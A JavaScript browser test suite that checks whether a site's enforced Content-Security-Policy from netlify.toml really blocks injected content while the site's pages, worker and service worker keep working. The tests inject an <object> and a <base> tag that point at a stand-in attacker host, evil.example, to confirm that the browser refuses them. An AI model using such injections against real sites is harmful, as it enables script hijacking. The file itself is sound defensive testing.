// The enforced Content-Security-Policy, verified by a BROWSER blocking things.
//
// The 2026-09-05 audit's point about F14 was that a policy which is only ever
// read as a string proves nothing: "Static CSP tests principally check origin
// inventory, not blocked execution." So this suite serves the repo behind the
// EXACT header netlify.toml ships, loads real pages through it, and asserts
// two things that a string comparison cannot:
//
//   1. the pages still work under it - the whole risk of enforcing anything;
//   2. an injected <object> and an injected <base> are actually refused, with
//      the browser reporting the violation.
//
// It runs its own server because the suite runner's static server (python's
// http.server) cannot add response headers. One extra port, torn down here.
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { extname, join, resolve, dirname, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';
import { newPage, closePage, goto, evaluate, evalAsync, waitForExpr, cleanErrors } from '../cdp.mjs';

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), '../../..');

/** The enforced policy, read from netlify.toml so the two cannot drift. */
async function enforcedPolicy() {
  const toml = await readFile(join(REPO, 'netlify.toml'), 'utf8');
  for (const line of toml.split('\n')) {
    const m = /^\s*([A-Za-z-]+)\s*=\s*"(.*)"\s*$/.exec(line);
    if (m && m[1] === 'Content-Security-Policy') return m[2];
  }
  return null;
}

const MIME = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8', '.webmanifest': 'application/manifest+json',
  '.svg': 'image/svg+xml', '.png': 'image/png', '.jpg': 'image/jpeg',
  '.webp': 'image/webp', '.ico': 'image/x-icon', '.woff2': 'font/woff2',
};

async function startCspServer(policy) {
  const server = createServer(async (req, res) => {
    let urlPath;
    try { urlPath = decodeURIComponent(new URL(req.url, 'http://x').pathname); }
    catch { res.writeHead(400).end(); return; }
    // Contain the path inside the repo: this server is only ever reachable
    // from 127.0.0.1 during a test run, but a traversal here would still be a
    // traversal.
    const rel = normalize(urlPath).replace(/^(\.\.[/\\])+/, '');
    let file = join(REPO, rel);
    if (urlPath.endsWith('/')) file = join(file, 'index.html');
    try {
      const body = await readFile(file);
      res.writeHead(200, {
        'Content-Type': MIME[extname(file)] || 'application/octet-stream',
        'Content-Security-Policy': policy,
      });
      res.end(body);
    } catch {
      res.writeHead(404, { 'Content-Type': 'text/plain', 'Content-Security-Policy': policy });
      res.end('not found');
    }
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  return { server, base: `http://127.0.0.1:${server.address().port}` };
}

export async function run({ cdpPort }) {
  const R = [];
  const t = (name, pass, detail = '') => R.push({ name, pass: !!pass, detail });

  const policy = await enforcedPolicy();
  t('netlify.toml ships an enforcing Content-Security-Policy', !!policy, String(policy));
  if (!policy) return R;

  const { server, base } = await startCspServer(policy);
  const s = await newPage(cdpPort);

  // A page records every violation the browser reports, so the assertions
  // below are about what the ENGINE did, not about what the header said.
  const listen = `(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations.push({
        directive: e.effectiveDirective || e.violatedDirective,
        blocked: String(e.blockedURI || '').slice(0, 200),
        disposition: e.disposition,
      });
    });
    return 1;
  })()`;

  try {
    // ---------------------------------------------------------- it blocks --
    await goto(s, `${base}/home.html`);
    await evaluate(s, listen);

    // <object> pointing at a foreign origin: exactly what object-src 'none'
    // exists for, and what the report-only policy never actually stopped.
    await evalAsync(s, `(async () => {
      const o = document.createElement('object');
      o.data = 'https://evil.example/payload.swf';
      o.type = 'application/x-shockwave-flash';
      document.body.appendChild(o);
      await new Promise(r => setTimeout(r, 250));
      return 1;
    })()`);
    const afterObject = await evaluate(s, 'JSON.stringify(window.__cspViolations)');
    const objectBlocked = /object-src/.test(afterObject);
    t('an injected <object> is BLOCKED by the enforced policy, and reported',
      objectBlocked, afterObject);
    t('and the browser reports it as an ENFORCED violation, not a report-only one',
      /"disposition":"enforce"/.test(afterObject), afterObject);

    // <base href> re-roots every relative URL on the page: an injected one
    // turns every same-origin script tag into a request to the attacker.
    await goto(s, `${base}/home.html`);
    await evaluate(s, listen);
    await evalAsync(s, `(async () => {
      const b = document.createElement('base');
      b.href = 'https://evil.example/';
      document.head.appendChild(b);
      await new Promise(r => setTimeout(r, 250));
      return 1;
    })()`);
    const afterBase = await evaluate(s, 'JSON.stringify(window.__cspViolations)');
    t('an injected <base> is BLOCKED by the enforced policy',
      /base-uri/.test(afterBase), afterBase);
    t('so relative URLs still resolve to this origin',
      (await evaluate(s, "new URL('x.js', document.baseURI).origin")) === base,
      await evaluate(s, 'document.baseURI'));

    // ------------------------------------------------- and it breaks nothing
    // The whole risk of enforcing anything. Every app plus the marketing
    // pages, loaded behind the real header, must boot with no page errors, no
    // first-party request failures, and no enforced violation of their own.
    const PAGES = [
      'home.html', 'apps.html', 'work.html', 'about.html', 'contact.html', 'privacy.html',
      'apps/trip-planner/index.html', 'apps/gym-tracker/index.html',
      'apps/fpl-planner/index.html', 'apps/mario-kart/index.html',
      'apps/football-h2h/index.html', 'apps/maptap-rivals/index.html',
      'apps/arena/index.html',
    ];
    for (const page of PAGES) {
      await goto(s, `${base}/${page}`);
      await evaluate(s, listen);
      // Let the app's own boot run: workers register, modules import, the
      // auth modal and the sync scripts load.
      await evalAsync(s, '(async () => { await new Promise(r => setTimeout(r, 900)); return 1; })()');
      const violations = JSON.parse(await evaluate(s, 'JSON.stringify(window.__cspViolations)'));
      const enforced = violations.filter((v) => v.disposition === 'enforce');
      t(`${page} loads clean under the enforced policy`,
        enforced.length === 0, JSON.stringify(enforced).slice(0, 400));
      const errs = cleanErrors(s);
      t(`${page} throws nothing under the enforced policy`,
        errs.length === 0, errs.join(' | ').slice(0, 400));
    }

    // The FPL worker and the two PWA service workers are the integrations the
    // audit named as needing explicit validation before promotion.
    await goto(s, `${base}/apps/fpl-planner/index.html`);
    await evaluate(s, listen);
    const workerOk = await evalAsync(s, `(async () => {
      try {
        const w = new Worker('js/engine/worker.js', { type: 'module' });
        await new Promise(r => setTimeout(r, 600));
        w.terminate();
        return 'ok';
      } catch (e) { return 'threw: ' + e.message; }
    })()`);
    t('the FPL planner worker still constructs under the enforced policy',
      workerOk === 'ok', String(workerOk));

    await goto(s, `${base}/apps/trip-planner/index.html`);
    await evaluate(s, listen);
    const swOk = await evalAsync(s, `(async () => {
      try {
        const reg = await navigator.serviceWorker.register('sw.js');
        await new Promise(r => setTimeout(r, 800));
        await reg.unregister();
        return 'ok';
      } catch (e) { return 'threw: ' + e.message; }
    })()`);
    t('the Trip Planner service worker still registers under the enforced policy',
      swOk === 'ok', String(swOk));
  } finally {
    await closePage(s);
    await new Promise((r) => server.close(r));
  }

  return R;
}
